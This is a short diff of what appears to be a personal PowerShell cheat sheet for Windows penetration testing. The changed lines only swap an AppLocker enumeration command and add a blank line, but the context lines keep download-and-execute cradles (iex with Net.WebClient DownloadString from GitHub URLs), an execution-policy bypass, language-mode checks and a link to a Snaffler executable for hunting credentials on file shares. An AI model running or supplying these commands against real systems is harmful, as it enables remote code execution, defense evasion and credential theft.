@@ -4,7 +4,7 @@ iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 
 $ExecutionContext.SessionState.LanguageMode
 
-Get-AppLockerPolicy -Effective -Xml
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 Set-ExecutionPolicy Bypass -Scope Process
 
@@ -24,5 +24,6 @@ iex(new-object net.webclient).downloadstring('https://github.com/pcwph1L/pcwpc/r
 
 snaff
 https://github.com/pcwph1L/pcwpc/raw/refs/heads/main/snaff.exe
+
 
 
